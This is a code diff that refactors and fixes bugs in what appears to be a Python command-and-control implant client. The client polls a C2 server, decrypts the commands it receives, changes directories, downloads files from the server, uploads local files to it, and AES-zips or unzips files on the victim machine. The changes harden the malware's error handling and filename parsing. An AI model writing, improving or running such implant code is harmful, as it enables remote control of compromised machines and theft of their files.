@@ -6,7 +6,7 @@ from time import sleep, time
 from requests import exceptions, get, post, put
 from sys import platform
 from encryption import cipher
-from settings import FILE_REQUEST, FILE_SEND, PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER, ZIP_PASSWORD
+from settings import FILE_REQUEST, FILE_SEND, PORT, CMD_REQUEST, CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER, ZIP_PASSWORD
 from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES
 
 if getenv("OS") == "Windows_NT":
@@ -30,13 +30,14 @@ def post_to_server(message: str, response_path: str = RESPONSE):
     except exceptions.RequestException:
         return
 
-def get_filename(input_string, replace=True):
-    """ This is a function that splits apart a string on whitespace and returns items 3 and greater, wihch should be a 
+def get_filename(input_string):
+    """ This is a function that splits apart a string on whitespace and returns items 3 and greater, which should be a
     filename according to our use-cases. """
-    try:
-            return " ".join(input_string.split()[2:]).replace("\\", "/")
-    except IndexError:
+    parts = input_string.split()
+    if len(parts) < 3:
         post_to_server(f"You must enter a filename after {input_string}.\n")
+        return None
+    return " ".join(parts[2:]).replace("\\", "/")
 
 # Try an HTTP GET request to the c2 server and retrieve a response; if it fails, keep trying forever
 while True:
@@ -51,7 +52,12 @@ while True:
         continue
     
     # Retrieve the command via the decrypted and decoded content of the response object
-    command = cipher.decrypt(response.content).decode()
+    try:
+        command = cipher.decrypt(response.content).decode()
+    except Exception:
+        print("Failed to decrypt command from server")
+        sleep(DELAY)
+        continue
 
     # If the command starts with "cd ", slice out directory and chdir to it
     if command.startswith("cd "):
@@ -80,9 +86,12 @@ while True:
         # Split out the filepath to download and replace \ with /
         filepath = get_filename(command)
 
-        # If we had an IndexError, start a new iteration of the while loop
+        # If we had no filename, start a new iteration of the while loop
         if filepath is None:
             continue
+
+        # Get the basename for use when writing the file
+        filename = path.basename(filepath)
 
         # UTF-8 encode the filename first to be able to encrypt it, but then we must decode it after the encryption
         encrypted_filepath = cipher.encrypt(filepath.encode()).decode()
@@ -91,22 +100,24 @@ while True:
         try:
             with get(url=f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:
 
-                # If the file was not found, open it up and write it out to disk, then notify us on the server
+                # If the file was found, write it out to disk, then notify us on the server
                 if response.status_code == 200:
                     with open(filename, "wb") as file_handle:
                         # Decrypt the response content and write the file out to disk, then notify us on the server
                         file_handle.write(cipher.decrypt(response.content))
                     post_to_server(f"{filename} is now on {client}.\n")
+                else:
+                    post_to_server(f"{filename} was not found on the c2 server.\n")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to write {filename} to disk on {client}.\n")
 
     # The "client upload FILENAME" command allows us to push files from the client to our c2 server
     elif command.startswith("client upload"):
         
-        # Split out the filepath to download and replace \ with /
+        # Split out the filepath to upload and replace \ with /
         filepath = get_filename(command)
 
-        # If we had an Index Error, start a new interation of the while loop
+        # If we had no filename, start a new iteration of the while loop
         if filepath is None:
             continue
 
@@ -130,7 +141,7 @@ while True:
         # Split out the filepath to download and replace \ with /
         filepath = get_filename(command)
 
-        # If we had an Index Error, start a new interation of the while loop
+        # If we had no filename, start a new iteration of the while loop
         if filepath is None:
             continue
 
@@ -147,9 +158,7 @@ while True:
                     post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n")
                 else:
                     zip_file.write(filepath, filename)
-                    post_to_server(f"{filepath} in now zip-encrypted on {client}.\n")
-        except IndexError:
-            post_to_server("You must enter the filepath to zip.")
+                    post_to_server(f"{filepath} is now zip-encrypted on {client}.\n")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on client.\n")
 
@@ -159,12 +168,9 @@ while True:
         # Split out the filepath to unzip and replace \ with /
         filepath = get_filename(command)
 
-        # If we had an Index Error, start a new interation of the while loop
+        # If we had no filename, start a new iteration of the while loop
         if filepath is None:
             continue
-
-        # Return the basename of filepath
-        filename = path.basename(filepath)
 
         # Unzip/decrypt file using AES encryption and LZMA compression method
         try:
@@ -172,8 +178,6 @@ while True:
                 zip_file.setpassword(ZIP_PASSWORD)
                 zip_file.extractall(path.dirname(filepath))
                 post_to_server(f"{filepath} is now unzipped and decrypted on the {client}.\n")
-        except IndexError:
-            post_to_server("You must enter the filepath to unzip.")
         except (FileNotFoundError, PermissionError, OSError):
             post_to_server(f"Unable to access {filepath} on client.\n")
                     
